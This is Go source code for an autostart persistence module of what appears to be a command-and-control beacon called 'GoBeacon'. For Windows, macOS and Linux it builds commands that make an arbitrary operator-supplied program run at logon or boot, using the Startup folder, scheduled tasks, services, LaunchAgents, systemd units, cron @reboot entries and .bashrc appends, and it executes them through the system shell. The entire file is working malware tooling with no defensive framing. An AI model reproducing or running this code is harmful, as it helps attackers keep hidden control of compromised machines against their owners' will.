// Autostart Persistence module - Cross-platform startup persistence

func (b *GoBeacon) moduleAutostartPersistence(parameters string) string {
	var result strings.Builder
	result.WriteString("=== AUTOSTART PERSISTENCE ===\n")

	parts := strings.Split(parameters, ",")
	if len(parts) < 2 {
		result.WriteString("Autostart persistence requires: method,command\n")
		result.WriteString("Available methods by platform:\n")
		methods := b.getAutostartMethods()
		for method, desc := range methods {
			result.WriteString(fmt.Sprintf("  %s: %s\n", method, desc))
		}
		return result.String()
	}

	method := strings.TrimSpace(parts[0])
	command := strings.TrimSpace(parts[1])

	methods := b.getAutostartMethods()
	if desc, exists := methods[method]; exists {
		result.WriteString(fmt.Sprintf("Using method: %s\n", desc))

		persistCmd := b.buildAutostartCommand(method, command)
		if persistCmd == "" {
			result.WriteString("ERROR: Method not available on this platform\n")
			return result.String()
		}

		result.WriteString(fmt.Sprintf("Executing: %s\n", persistCmd))

		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("cmd", "/C", persistCmd)
		} else {
			cmd = exec.Command("sh", "-c", persistCmd)
		}

		output, err := cmd.Output()
		if err != nil {
			result.WriteString(fmt.Sprintf("ERROR: %v\n", err))
		} else {
			result.WriteString("Persistence mechanism created successfully\n")
			result.WriteString(string(output))
		}
	} else {
		result.WriteString(fmt.Sprintf("Unknown method: %s\n", method))
	}

	return result.String()
}

func (b *GoBeacon) getAutostartMethods() map[string]string {
	methods := make(map[string]string)

	if runtime.GOOS == "windows" {
		methods["startup"] = "Windows Startup folder"
		methods["task"] = "Scheduled task"
		methods["service"] = "Windows service"
	} else if runtime.GOOS == "darwin" {
		methods["launchagent"] = "macOS Launch Agent"
		methods["launchdaemon"] = "macOS Launch Daemon"
		methods["cron"] = "Cron job"
	} else {
		methods["systemd"] = "Systemd service"
		methods["init"] = "Init script"
		methods["cron"] = "Cron job"
		methods["bashrc"] = "Bash profile"
	}

	return methods
}

func (b *GoBeacon) buildAutostartCommand(method, command string) string {
	switch runtime.GOOS {
	case "windows":
		switch method {
		case "startup":
			startupPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
			batFile := filepath.Join(startupPath, "autostart.bat")
			return fmt.Sprintf("echo %s > \"%s\"", command, batFile)
		case "task":
			return fmt.Sprintf("schtasks /create /tn \"AutoTask\" /tr \"%s\" /sc onlogon", command)
		case "service":
			return fmt.Sprintf("sc create AutoService binPath= \"%s\"", command)
		}
	case "darwin":
		switch method {
		case "launchagent":
			homeDir, _ := os.UserHomeDir()
			plistPath := filepath.Join(homeDir, "Library", "LaunchAgents", "com.autostart.agent.plist")
			return fmt.Sprintf("echo '<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE plist><plist><dict><key>Label</key><string>com.autostart.agent</string><key>ProgramArguments</key><array><string>%s</string></array><key>RunAtLoad</key><true/></dict></plist>' > \"%s\"", command, plistPath)
		case "cron":
			return fmt.Sprintf("(crontab -l 2>/dev/null; echo \"@reboot %s\") | crontab -", command)
		}
	default:
		switch method {
		case "systemd":
			return fmt.Sprintf("echo '[Unit]\\nDescription=AutoStart\\n[Service]\\nExecStart=%s\\n[Install]\\nWantedBy=multi-user.target' > /etc/systemd/system/autostart.service && systemctl enable autostart.service", command)
		case "cron":
			return fmt.Sprintf("(crontab -l 2>/dev/null; echo \"@reboot %s\") | crontab -", command)
		case "bashrc":
			homeDir, _ := os.UserHomeDir()
			return fmt.Sprintf("echo '%s' >> %s/.bashrc", command, homeDir)
		}
	}
	return ""
}
